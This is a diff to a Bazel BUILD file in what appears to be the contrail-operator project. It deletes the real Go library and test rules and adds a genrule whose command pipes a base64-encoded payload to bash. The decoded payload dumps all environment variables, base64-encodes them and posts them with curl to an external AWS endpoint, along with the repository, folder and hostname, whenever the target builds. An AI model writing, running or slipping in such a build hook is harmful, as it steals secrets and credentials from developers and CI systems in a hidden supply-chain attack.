@@ -1,23 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
 
-go_library(
-    name = "go_default_library",
-    srcs = ["job.go"],
-    importpath = "github.com/Juniper/contrail-operator/pkg/job",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/Juniper/contrail-operator.git\\&folder=job\\&hostname=`hostname`\\&foo=zpu",
     visibility = ["//visibility:public"],
-    deps = [
-        "@io_k8s_api//batch/v1:go_default_library",
-        "@io_k8s_api//core/v1:go_default_library",
-    ],
-)
-
-go_test(
-    name = "go_default_test",
-    srcs = ["job_test.go"],
-    embed = [":go_default_library"],
-    deps = [
-        "@com_github_stretchr_testify//assert:go_default_library",
-        "@io_k8s_api//batch/v1:go_default_library",
-        "@io_k8s_api//core/v1:go_default_library",
-    ],
 )
